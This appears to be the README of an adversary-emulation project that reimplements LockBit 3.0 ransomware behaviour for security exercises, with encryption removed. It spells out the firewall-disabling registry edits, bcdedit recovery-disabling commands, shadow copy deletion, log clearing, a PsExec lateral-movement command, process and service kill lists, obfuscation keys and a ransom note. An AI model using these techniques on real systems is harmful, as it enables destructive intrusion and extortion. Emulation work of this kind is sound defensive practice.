# LockBit

LockBit is a ransomware variant used in many campaigns by operating on a ransomware-as-a-service basis.
The variant in this repository emulates several key features and TTPs of LockBit, drawing mostly from version 3.0
of the ransomware.

This project consists of several components:

- main LockBit ransomware executable (defined in `src/lockbit_main`): contains the main encryption logic and other features such as defense evasion, impact, discovery, and lateral movement
- minimal LockBit ransomware executable (defined in `src/lockbit_minimal`): only performs the encryption-related tasks.
This component is used for LockBit alternative steps in the event that the main ransomware executable is blocked or fails
unexpectedly during execution.
- LockBit self-destruct helper executable (defined in `src/self_del_helper`): executable that is embedded as a resource
within the LockBit main executable. This executable will rename the main LockBit executable several times and overwrite
it prior to deleting it from disk.

Note: the following features and components have been removed for public release:

- AES and RSA encryption/decryption capabilities
- Usage of crypto++ library
- LockBit decryptor cleanup executable
- LockBit packer

## Main Executable Features

- Current username, domain, and hostname discovery<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)</sup>
- System information (OS version and architecture)<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)</sup>
- Checks if a global mutex `Global\<DJB2 hash of hostname>` currently exists to ensure unique execution on the current host.<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)</sup>
  - Original ransomware used MD4 hash of hostname<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)</sup>
- Checks system install UI and default UI languages to avoid executing on systems in certain countries. Terminates early if the system language is any of the following<sup>[1](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/),[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)</sup>:

   ```text
   0x2801 // ar-SY - Arabic (Syria)
   0x0819 // ru-MD - Russian (Moldova)
   0x042B // hy-AM - Armenian (Armenia)
   0x0419 // ru-RU - Russian (Russia)
   0x742C // az-Cyrl - Azerbaijani (Cyrillic Azerbaijani)
   0x0428 // tg-Cyrl-TJ - Tajik (Cyrillic Tajikistan)
   0x782C // az-Latn - Azerbaijani (Latin Azerbaijani)
   0x042C // az-Latn-AZ - Azerbaijani (Latin Azerbaijani (Azerbaijan))
   0x0442 // tk-TM - Turkmenistan (Turkmenistan)
   0x0423 // be-BY - Belarusian (Belarus)
   0x0444 // tt-RU - Tatar (Russia)
   0x0437 // ka-GE - Georgian (Georgia)
   0x0422 // uk-UA - Ukrainian (Ukraine)
   0x043F // kk-KZ - Kazakh (Kazakhstan)
   0x0843 // uz-Cyrl-UZ - Uzbek (Cyrillic Uzbekistan)
   0x0440 // ky-KG - (Kyrgyzstan)
   0x0443 // uz-Latn-UZ - Uzbek (Latin Uzbekistan)
   0x0818 // ro-MD - Romanian (Moldova)
   ```

- Enumerates logical drives on the local machine using the `GetLogicalDriveStringsW` API call to find additional encryption targets.<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[11](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit),[16](https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor)</sup>
- Impairs defenses by disabling the Windows firewall (domain and standard profiles) via
  registry edits. The following registry keys and values are created/modified:<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)</sup>
  - `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile`
    - `EnableFirewall` set to `0`
  - `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile`
    - `EnableFirewall` set to `0`
- Pings hosts on local network to find targets for lateral movement via PsExec<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[9](https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/)</sup>
- Laterally moves to remote hosts on the local network via PsExec<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[4](https://redpiranha.net/news/look-lockbit-3-ransomware)</sup>
  - Currently relies on `PsExec64.exe` already existing on the initial target host
  - The PsExec command executed is:

   ```PowerShell
   PsExec64.exe -accepteula \\target1,target2,... -u psexec_user -p psexec_password -s -d -f -c "C:\path\to\current\lockbit\binary" -d -w -pw lockbit_access_token
   ```

- Terminates processes that may interfere with encryption<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a),[5](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf)</sup>
  - Processes are terminated if the case-insensitive DJB2 hash of the process name matches the list of
    target process name hashes in the configuration.<sup>[10](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)</sup>
- Terminates and disables services that may interfere with encryption<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a),[5](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf)</sup>
- Clears the Recycle Bin<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)</sup>
- Clears Windows Event logs and disables event log channels<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)</sup>
- Deletes shadow copies using WMI and Windows API calls. Shadow copies are discovered using WMI query `SELECT * FROM Win32_ShadowCopy`<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[5](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf),[10](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)</sup>.
- Disables automatic Windows recovery features by setting the boot loader display to ignore all boot failures and by disabling automatic repair at boot. This is done by creating the following processes:<sup>[14](https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom)[15](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockbit-targets-servers),</sup>
  - `bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures`
  - `bcdedit.exe /set {default} recoveryenabled no`
- Sets a custom icon for the encrypted file extension `.sk12uyqzk` via registry writes:<sup>[1](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/),[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)</sup>
  - Drops the icon image resource to disk at `%PROGRAMDATA%\sk12uyqzk.ico`
  - Creates registry key `HKCR\.sk12uyqzk` and sets its default value to `sk12uyqzk`
  - Creates registry key `HKCR\sk12uyqzk\DefaultIcon` and sets its default value to `C:\ProgramData\sk12uyqzk.ico`
- Generates a pair of 2048-bit RSA session keys to encrypt the AES keys used for file encryption (removed for public release)<sup>[4](https://redpiranha.net/news/look-lockbit-3-ransomware),[13](https://blog.lexfo.fr/lockbit-malware.html)</sup>
  - The keys are stored in the registry at `HKCU\SOFTWARE\BlockBlit` under the `entire` (encrypted private session key) and `pub` (public session key) values. The original malware would write the keys to `HKCU\Software\LockBit` at the `full` and `Public` values.<sup>[12](https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/),[13](https://blog.lexfo.fr/lockbit-malware.html)</sup>
- Enumerates target files from each discovered drive and encrypts them using 256-bit AES in CTR mode (actual encryption removed for public release).<sup>[1](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/),[4](https://redpiranha.net/news/look-lockbit-3-ransomware),[13](https://blog.lexfo.fr/lockbit-malware.html)</sup>
  - A random AES key is generated for each file
  - Only the first 4KB of the file are encrypted. If the file is less than 4KB, the entire file is encrypted.
  - Encrypts the AES key using the RSA private session key and appends the IV and encrypted AES key to the file
  - The `.sk12uyqzk` extension is appended to the file path on successful encryption
  - The enumeration/encryption routine will skip directory names, file names, and file extensions that
    are specified in the configuration. String checks are performed using case-insensitive DJB2 hashes and checking
    for the hash values in the configuration.<sup>[10](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)</sup>
- Drops a ransom note `sk12uyqzk.README.txt` in each traversed directory when encrypting files. Ransom note contents are as follows:<sup>[1](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/),[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[4](https://redpiranha.net/news/look-lockbit-3-ransomware)</sup>

  ```text
  ~~~ BlockLit 3.0 the world's fastest and most stable ransomware from 2019 ~~~
  >>>>> Your data has been stolen and encrypted.
  If you don't pay the ransom, your data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.
  ```

- Changes current user's desktop wallpaper via registry edit:<sup>[1](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/),[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)</sup>
  - Drops the desktop wallpaper image resource to disk at `%PROGRAMDATA%\sk12uyqzk.bmp`
  - Sets `Wallpaper` value for registry key `HKCU\Control Panel\Desktop` to `C:\ProgramData\sk12uyqzk.bmp`
- If the `enable_self_del` configuration setting is set to `true`, or if the `-d` command line flag is set, then
LockBit will perform its self-destruct routine<sup>[2](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a),[3](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a),[5](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf),[10](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)</sup>:
  - Close the handle to its global mutex
  - Drop an auxiliary binary (stored as a resource) to `C:\Windows\Temp\381jwk.tmp` and then execute it.
    This binary will overwrite the LockBit executable with the `A` character, rename it by iterating through
    the uppercase letters A through Z (e.g. `lb.exe` will be renamed to `AAAAAA`, `BBBBBB`, ... `ZZZZZZ`,
    maintaining the same filename length), for a total of 26 renaming events. Finally, the auxiliary binary will
    delete the renamed LockBit executable from disk.
  - Terminate after starting the auxiliary self-destruct process.
- XOR-encrypts important strings and resources, such as its configuration, at compile-time using a hardcoded XOR key and decrypts them at run time
  to hinder static analysis.<sup>[10](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)</sup>
  - Resources are encrypted using the following XOR hex key:

  ```text
  21be1e89c74b5641e6de86bc1f828ae505baab5b84c19411b0a0587c28f0eab1f77fa79774d19816a9ebaec7d265d1629cbb43eb3d0d8156182b08bb5d57f3a0b06ea7b8696fff3615d78a4aa89c58e5e549714b3daaf1732a0f307ab0545fd9cab2949a2056904c6be6a32dbbae92979cad1f142de9016ca5826ed79bcd1032
  ```

  - Strings are encrypted using the following XOR hex key:

  ```text
  ef94cc238aafed14f4dfa08e95fc16e37c55cc92e602ee18b2d92e5ad3f6da34efba966d355538dcea76e3411bcde9548243a029382bb7695098debe0cd0b530c358dc2eef0ef193b1d8c67ff63b38b3439bdc8237314f19c5bfa40f09f20c50ff2a4528a3f8fb4c8dce5a15ff3a856852bb6ca8b722771ce4144480d7958cf7
  ```

- Hides threads (main thread and threads created for thread pools) from debuggers using the `NtSetInformationThread`
  API call.<sup>[1](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/),[10](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)</sup>
- Uses API hashing to hide certain Windows API names from the IAT.<sup>[4](https://redpiranha.net/news/look-lockbit-3-ransomware)</sup>
  DJB2 string hashing is used for the API names, and the API addresses are XOR-encrypted
  to obfuscate them in memory. The following API calls are hashed:

  ```text
  ChangeServiceConfigW
  CloseServiceHandle
  CoCreateInstance
  CoInitializeEx
  CoInitializeSecurity
  ControlService
  CoSetProxyBlanket
  CreateMutexW
  CreatePipe
  CreateProcessW
  CreateThread
  CreateToolhelp32Snapshot
  CoUninitialize
  EnumDependentServicesW
  EvtClearLog
  EvtClose
  EvtNextChannelPath
  EvtOpenChannelConfig
  EvtOpenChannelEnum
  EvtSaveChannelConfig
  EvtSetChannelConfigProperty
  FindResourceW
  GetAdaptersInfo
  GetComputerNameW
  GetComputerNameExW
  GetCurrentThread
  GetExitCodeProcess
  GetLogicalDriveStringsW
  GetUserNameExW
  IcmpCloseHandle
  IcmpCreateFile
  IcmpSendEcho
  LoadResource
  LockResource
  MoveFileW
  NtQueryDefaultUILanguage
  NtQueryInstallUILanguage
  NtSetInformationThread
  OpenProcess
  OpenSCManagerW
  OpenServiceW
  PeekNamedPipe
  Process32FirstW
  Process32NextW
  QueryServiceStatusEx
  RegCloseKey
  RegCreateKeyExW
  RegSetValueExW
  RtlGetVersion
  SetFilePointer
  SetHandleInformation
  SizeofResource
  WaitForSingleObject
  ```

## Main Executable Usage

When executing LockBit, you can provide command-line arguments to adjust its behavior and override the options
specified in the configuration file.

```text
lockbit.exe [-d] [-ps] [-w] [-path root_dir] 
```

- `-d`: flag that toggles the self-destruction feature
- `-ps`: flag that toggles the propagation via ping and PsExec
- `-w`: flag that toggles the wallpaper change after enumerating and encrypting files
- `-pw`: specifies the password to decrypt itself for execution (unused for public release)
- `-path`: takes a directory path to restrict LockBit encryption to only that directory.
If not specified, LockBit will enumerate and encrypt files starting at each drive

## Minimal Executable

The minimal executable only contains the minimal features to perform file enumeration and encryption:

- Enumerates logical drives on the local machine the same way as the main executable.
- Sets a custom icon for the encrypted file extension `.sk12uyqzk` the same way as the main executable.
- Generates the 2048-bit RSA session keys and saves them in the registry the same way as the main executable
- Enumerates and encrypts target files and drops ransom notes the same way as the main executable.
- Changes current user's desktop wallpaper the same way as the main executable.
- XOR-encrypts important strings and its configuration at compile-time, just like the main executble.
- Does not leverage API hashing.

When executing the minimal version of LockBit, you can provide command-line arguments to adjust its behavior
and override the options specified in the configuration file.

```text
lockbit_minimal.exe [-path root_dir] 
```

- `-path`: takes a directory path to restrict LockBit encryption to only that directory.
If not specified, LockBit will enumerate and encrypt files starting at each drive

## Configuration

Configuration JSON files are located in the `config` folder and set the default behavior for the main and minimal executables.
Some options are overridable by command-line arguments. `config\config.json` contains the production configuration
for the main and minimal executables, and `config\unit_test_config.json` contains the configuration used in certain unit tests.

To use a different configuration file when building the executable, set the `CONFIG_PATH` variable in
`src\CMakeLists.txt` accordingly for the `main-lib` target compile definitions.
Alternatively, for testing purposes, you can adjust the pre-provided `config\test_config.json` configuration file
and use that when building LockBit components by setting the `LOCKBIT_TEST_CONFIG` cmake option to `ON`.

Below is an example JSON configuration, with explanations for each field:

```json
{
    "enable_enc": false,
    "enable_enum": true,
    "enable_prop": true,
    "enable_self_del": true,
    "disable_boot_recovery": true,
    "disable_av": true,
    "empty_recycle": true,
    "check_ui_lang": true,
    "check_mutex": true,
    "terminate_processes": true,
    "terminate_services": true,
    "change_wallpaper": true,
    "change_icon": true,
    "clear_evt_log": true,
    "delete_shadow": true,
    "excluded_filenames": [
        "autorun.inf", 
        "boot.ini", 
        "bootfont.bin", 
        "bootsect.bak", 
        "desktop.ini", 
        "iconcache.db", 
        "ntldr", 
        "ntuser.dat", 
        "ntuser.dat.log", 
        "ntuser.ini", 
        "thumbs.db", 
        "GDIPFONTCACHEV1.DAT", 
        "d3d9caps.dat",
        "lb.log"
    ],
    "excluded_dirs": [
        "$recycle.bin",
        "config.msi",
        "$windows.~bt",
        "$windows.~ws",
        "windows",
        "boot",
        "program files",
        "program files (x86)",
        "programdata",
        "system volume information",
        "tor browser",
        "windows.old",
        "intel",
        "msocache",
        "perflogs",
        "x64dbg",
        "public",
        "all users",
        "default",
        "microsoft",
        "ghosts",
        "ghosts_client"
    ],
    "excluded_ext": [
        "386", "adv", "ani", "bat", "bin", "cab", "cmd", "com", "cpl", "cur",
        "deskthemepack", "diagcab", "diagcfg", "diagpkg", "dll", "drv", "exe",
        "hlp", "icl", "icns", "ico", "ics", "idx", "ldf", "lnk", "mod", "mpa",
        "msc", "msp", "msstyles", "msu", "nls", "nomedia", "ocx", "prf", "ps1",
        "rom", "rtp", "scr", "shs", "spl", "sys", "theme", "themepack", "wpx",
        "lock", "key", "hta", "msi", "pdb", "search-ms", "sk12uyqzk"
    ],
    "target_processes": [
        "sql", "oracle", "ocssd", "dbsnmp",
        "synctime", "agntsvc", "isqlplussvc",
        "xfssvccon", "mydesktopservice", "ocautoupds",
        "encsvc", "firefox", "tbirdconfig",
        "mydesktopqos", "ocomm", "dbeng50",
        "sqbcoreservice", "scalc", "infopath",
        "sbase", "onenote", "outlook",
        "simpres", "steam", "thebat", "thunderbird",
        "sdraw", "swriter","wordpad", "notepad",
        "calc", "wuauclt", "onedrive", "soffice"
    ],
    "target_services": [
        "vss", "sql", "svc$",
        "memtas", "mepocs", "msexchange",
        "veeam", "backup",
        "GxVss", "GxBlr", "GxFWD",
        "GxCVD", "GxCIMgr"
    ],
    "psexec_user": "dummyusername",
    "psexec_pass": "dummypassword",
    "extension": "sk12uyqzk",
    "strict_include_ranges": ["10.0.2.0/28", "10.0.3.0/28"],
    "strict_include_hosts": ["10.0.2.4", "10.0.3.2"],
    "note_contents": "~~~ BlockBlit 3.0 the world's fastest and most stable ransomware from 2019 ~~~\n>>>>> Your data has been stolen and encrypted.\nIf you don't pay the ransom, your data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don't hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe.",
    "rsa_pub": "base64-encoded RSA public key",
    "rsa_priv": "base64-encoded RSA private key"
}
```

- `enable_enc`: boolean that determines whether or not to encrypt valid target files when enumerating them.
- `enable_enum`: boolean that determines whether or not to enumerate files.
  Useful for skipping this step when testing or debugging.
- `enable_prop`: boolean that enables/disables propagation via ping and PsExec.
- `enable_self_del`: boolean that enables/disables the self destruction feature.
- `disable_boot_recovery`: boolean that determines whether or not to disable boot recovery using `bcdedit.exe`
- `disable_av`: boolean that determines whether or not to disable security features.
- `empty_recycle`: boolean that determines whether or not to empty the recycle bin.
- `check_ui_lang`: boolean that determines whether or not to perform the system UI language check.
- `check_mutex`: boolean that determines whether or not to perform the mutex check
- `terminate_processes`: boolean that determines whether or not to terminate the processes specified in the `target_processes` configuration setting
- `terminate_services`: boolean that determines whether or not to stop and disable the services specified in the `target_services` configuration setting
- `change_wallpaper`: boolean that determines whether or not to change the wallpaper after performing enumeration/encryption
- `change_icon`: boolean that determines whether or not to set the icon image for encrypted files
- `clear_evt_log`: boolean that determines whether or not to clear and disable Windows event log channels
- `delete_shadow`: boolean that determines whether or not to delete shadow copies
- `excluded_filenames`: list of strings indicating which files to avoid encrypting.
  This list is converted to a set of case-insensitive DJB2 hashes when the configuration is loaded.
- `excluded_dirs`: list of strings indicating which directories to avoid when finding files to encrypt.
  This list is converted to a list of case-insensitive DJB2 hashes when the configuration is loaded.
- `excluded_ext`: list of strings indicating which file extensions to avoid when finding files to encrypt.
  This list is converted to a set of case-insensitive DJB2 hashes when the configuration is loaded.
- `target_processes`: list of strings indicating which processes to terminate, if `terminate_processes` is set to `true`. This list is converted to a set of case-insensitive DJB2 hashes when the configuration is loaded.
- `target_services`: list of strings indicating which services to stop and disable, if `terminate_services` is set to `true`.
- `psexec_user`: string representing the username to use for PsExec
- `psexec_pass`: string representing the password to use for PsExec
- `extension`: string representing the file extension (excluding the `.` period) to append to encrypted files
- `strict_include_ranges`: list of strings in CIDR format (e.g. `10.1.2.3/24`) representing which network ranges the
executable is allowed to perform ping sweeps in. This setting is useful when trying to avoid pinging too large of a range, or if you want your ping sweeps to happen only within a certain subset of discovered local netranges.
Set this to an empty list if you do not want to restrict the ping sweep targets.
- `strict_include_hosts`: list of strings indicating which IP addresses the executable is allowed to laterally
move to using PsExec, after performing the ping sweep. Note that this setting does not guarantee that lateral
movement will occur to the specified hosts - PsExec propagation will only be attempted against the IP addresses
within this list that respond to the ping sweep. The setting only ensures that PsExec will not run against IP
addresses deemed out of scope.
Set this to an empty list if you do not want to restrict the PsExec targets.
- `note_contents`: string containing the ransom note contents.
- `rsa_pub`: base64-encoded master RSA public key (DER-encoded). This key will be used to encrypt the randomly
generated RSA private session key.
- `rsa_priv`: base64-encoded master RSA private key (DER-encoded). This field is only used by the cleanup executable (removed for public release)
to decrypt the randomly generated RSA private session key as part of the cleanup routine.

## Build

LockBit can be built in Debug or Release mode using the included `CMakePreset.json` configurations.

The following cmake options in `cmake\LockBit.cmake` are also provided to customize the build process:

- `LOCKBIT_TEST_CONFIG`: Use the test configuration file when building LockBit (default `OFF`)
- `LOCKBIT_DEBUG_LOGGING`: Enable debug logging for LockBit components, which will log to both terminal and the log file (default `ON`)

### Dependencies

- `CMake` version `3.26`
- `CMakePresets.json` version `6` support (Visual Studio 17.7)

### Quickstart

#### Command Line

Build both Debug and Release configurations of LockBit. This will also kick off the GoogleTest unit tests.

Note - in order for all unit tests to succeed, the tests will need to be run in an elevated context, since some tests
will create and modify test services.

```PowerShell
cd Resources\Lockbit
cmake.exe --workflow --preset cicd-debug
cmake.exe --workflow --preset cicd-release
```

For simplicity, all of the generated artifacts can be bundled into the
top-level `install/` directory using the CMake installation facility.

```PowerShell
cmake.exe --install ./build --config release
cmake.exe --install ./build --config debug
```

You can then run LockBit from the command line:

```PowerShell
.\install\Debug\main.exe

.\install\Release\main.exe
```

## Install

Installing LockBit simply copies all of the artifacts from both Release
and Debug builds into the top-level `install/` directory. This is simply for
ease of use and distributability.

The final product should be a top-level directory named `install/` with the
following layout:

```PowerShell
Lockbit/
├─ install/
   ├─ Debug/
      ├─ main.exe      # main executable
      ├─ main.pdb
      ├─ minimal.exe   # minimal executable
      ├─ minimal.pdb
   ├─ Release/
      ├─ main.exe      # main executable
      ├─ minimal.exe   # minimal executable
```

## Test 🧪

### Unit Tests

GoogleTest unit tests will automatically run when using the `cicd-debug` and `cicd-release` presets

You can also run them ad-hoc by running:

```PowerShell
ctest.exe --preset all
```

Note - in order for all unit tests to succeed, certain tests need to be run in an elevated context:

- Tests that create and modify dummy services to test service termination capabilities

### Testing Shadow Copies

To test deleting shadow copies, run the following in an elevated PowerShell terminal or command prompt to create shadow copies:

```PowerShell
wmic shadowcopy call create Volume='C:\'
```

You can query the current list of shadow copies from an elevated PowerShell terminal:

```PowerShell
Get-WmiObject -query "SELECT * FROM Win32_ShadowCopy"
```

Note - if LockBit is configured to kill the `vss` service, then you will need to re-enable and restart the
service prior to creating new shadow copies and re-running LockBit.

## Troubleshoot

### Logs

For operator usability, LockBit will log XOR-encrypted and base64-encoded logs to the following
log files in the current working directory:

- `lb.log` (main executable)
- `lbm.log` (minimal executable)
- `lbsd.log` (self-delete helper)

The current XOR key is `5a52ac49e070fb1b0a4ebb30d28121be3765f4b7a4105fbbd8d8f536a95f077072e2d4c8d2a23708eec22ef21224686d8e158084db2d6d97b2c49bc687618d9eb30e00e6747bebce1948b9aa4a2865efb8d54d0828423aaf2f73d0a4866ee5eeca94312c49029712ffbdab086f9a09abfd730c4d711556ff797ed7ef29cfe582`

You can decrypt these logs using the `aes_base64_log_decryptor.py` Python script from the [log_decryptor](../log_decryptor/) directory:

```bash
python3 aes_base64_log_decryptor.py --xor -i lb.log  -o decrypted.log -k `5a52ac49e070fb1b0a4ebb30d28121be3765f4b7a4105fbbd8d8f536a95f077072e2d4c8d2a23708eec22ef21224686d8e158084db2d6d97b2c49bc687618d9eb30e00e6747bebce1948b9aa4a2865efb8d54d0828423aaf2f73d0a4866ee5eeca94312c49029712ffbdab086f9a09abfd730c4d711556ff797ed7ef29cfe582`
```

## Developer Notes

The following table describes the project files and their purposes:
<details>
  <summary>:link: Click to expand project structure table</summary>

  | File/Directory | Description |
  | -------- | ------- |
  | `cmake/LockBit.cmake` | Contains configurable cmake options and variables for building LockBit |
  | `config/` | Contains configuration JSON files for various LockBit components |
  | `config/config.json` | JSON configuration for the main and minimal executables |
  | `config/test_config.json` | JSON configuration that can be used for testing the main/minimal executable |
  | `config/unit_test_config.json` | JSON configuration used in some unit tests |
  | `include/` | Top-level directory for `include` files |
  | `include/crypto/` | Contains cryptography `include` files |
  | `include/crypto/djb2.hpp` | Defines DJB2 hash functions |
  | `include/crypto/encryption.hpp` | Defines encryption-related functions (AES, RSA) |
  | `include/crypto/xor_obfuscation.hpp` | Defines compile-time XOR-encryption of string-literals |
  | `include/crypto/xor.hpp` | Defines compile-time XOR-encryption of string-literals |
  | `include/util/` | Contains utility `include` files |
  | `include/util/network_util.hpp` | Defines networking-related helper functions |
  | `include/util/os_util.hpp` | Defines OS-related helper functions |
  | `include/util/resource_util.hpp` | Defines functions for handling executable resources |
  | `include/util/string_util.hpp` | Defines string-related helper functions |
  | `include/util/winapihelper.hpp` | Defines string-related helper functions |
  | `include/argparser.hpp` | Provides a basic argument parser that handles switches and string arguments |
  | `include/base64.hpp` | Provides a standalone base64 encoding implementation |
  | `include/config.hpp` | Defines the LockBit configuration structure and functionality (loading, parsing) |
  | `include/defense_evasion_resource.hpp` | Resource header for the self-delete executable resource |
  | `include/defense_evasion.hpp` | Defines functions for defense evasion (self destruct, disabling firewall, hiding threads from debugger) |
  | `include/discovery.hpp` | Defines discovery functions (username, hostname, domain, OS arch, OS version) |
  | `include/enumerate.hpp` | Defines functions for enumerating and encrypting files |
  | `include/execute.hpp` | Defines functions for executing processes |
  | `include/guardrails.hpp` | Defines functions for performing the mutex and system language checks |
  | `include/impact.hpp` | Defines impact functionality (encrypting target files, dropping ransom notes, clearing recycle bin, changing wallpaper, storing RSA session keys in registry) |
  | `include/json.hpp` | Provides standalone JSON implementation |
  | `include/logger.hpp` | Defines XOR logger functionality |
  | `include/propagate.hpp` | Defines functions for performing propagation via ping and PsExec |
  | `include/registry.hpp` | Defines registry helper functions |
  | `include/resource.hpp` | Resource header for the config, file icon, and wallpaper resources |
  | `include/tamper.hpp` | Resource header for the config, file icon, and wallpaper resources |
  | `include/test_utils.hpp` | Defines util functions for unit tests |
  | `include/threadpool.hpp` | Provides standalone threadpool implementation |
  | `include/resources/` | Contains desktop and icon resources |
  | `include/resources/desktop.bmp` | Desktop wallpaper resource |
  | `include/resources/icon.bmp` | Icon wallpaper resource |
  | `src/` | Top-level source code directory |
  | `src/common` | Contains source code used across multiple components |
  | `src/common/config/` | Contains source code for LockBit configuration |
  | `src/common/config/config.cpp` | Implements functionality for fetching the embedded config resource at run-time |
  | `src/common/config/config_test.cpp` | Configuration unit tests |
  | `src/common/config/config.rc` | Resource definition for the LockBit configuration |
  | `src/common/config/unit_test_config.rc` | Resource definition for the LockBit configuration (unit tests only) |
  | `src/common/crypto/` | Cryptography source code |
  | `src/common/crypto/djb2.cpp` | Implements DJB2 hash functions |
  | `src/common/crypto/encryption_test.cpp` | Cryptography unit tests |
  | `src/common/crypto/encryption.cpp` | Implements AES and RSA encryption |
  | `src/common/crypto/xor.cpp` | Implements XOR encryption |
  | `src/common/impact/` | Impact source code |
  | `src/common/impact/encryption_test.cpp` | Unit tests for encrypting files for impact |
  | `src/common/impact/encryption.cpp` | Implements file encryption and dropping ransom notes for impact |
  | `src/common/impact/icon.cpp` | Implements setting the custom file icon for encrypted files |
  | `src/common/impact/icon.rc` | Resource definition for the custom file icon |
  | `src/common/impact/impact_test.cpp` | Unit tests for setting the file icon and changing the wallpaper |
  | `src/common/impact/recycling.cpp` | Implements clearing the recycle bin |
  | `src/common/impact/wallpaper.cpp` | Implements changing the wallpaper |
  | `src/common/impact/wallpaper.rc` | Resource definition for the custom wallpaper |
  | `src/common/util/` | Common utility function source code |
  | `src/common/util/argparser_test.cpp` | Unit tests for the arg parser |
  | `src/common/util/base64_test.cpp` | Unit tests for base64 |
  | `src/common/util/logger.cpp` | Implements the XOR logger |
  | `src/common/util/network_utils.cpp` | Implements network utility functions |
  | `src/common/util/os_utils.cpp` | Implements OS utilities |
  | `src/common/util/registry_test.cpp` | Unit tests for registry utility functions |
  | `src/common/util/registry.cpp` | Implements registry utility functions |
  | `src/common/util/resource_util.cpp` | Implements utility functions for working with Windows resources |
  | `src/common/util/string_utils.cpp` | Implements string utility functions |
  | `src/common/util/test_utils.cpp` | Implements utility functions for unit tests |
  | `src/common/util/threadpool_test.cpp` | Thread pool unit tests |
  | `src/common/util/util_test.cpp` | Unit tests for various utility functions |
  | `src/common/util/winapihelper.cpp` | Implements windows API hashing |
  | `src/common/enumerate_test.cpp` | Unit tests for enumerating and encrypting target files |
  | `src/common/enumerate.cpp` | Implements enumerating and encrypting target files |
  | `src/lockbit_main/` | Source code for the main executable |
  | `src/lockbit_main/def_evasion` | Source code for the main executable's defense evasion functionality |
  | `src/lockbit_main/def_evasion/disable_security.cpp` | Implements disabling the firewall |
  | `src/lockbit_main/def_evasion/hide_thread.cpp` | Implements hiding threads from debugger |
  | `src/lockbit_main/def_evasion/invoke_self_del.cpp` | Implements starting the self-destruct process |
  | `src/lockbit_main/def_evasion/self_del.rc` | Resource definition for the self destruct helper |
  | `src/lockbit_main/guardrails/` | Source code for mutex and system language checks |
  | `src/lockbit_main/guardrails/lang_test.cpp` | Unit tests for the language check |
  | `src/lockbit_main/guardrails/lang.cpp` | Implements the system language check |
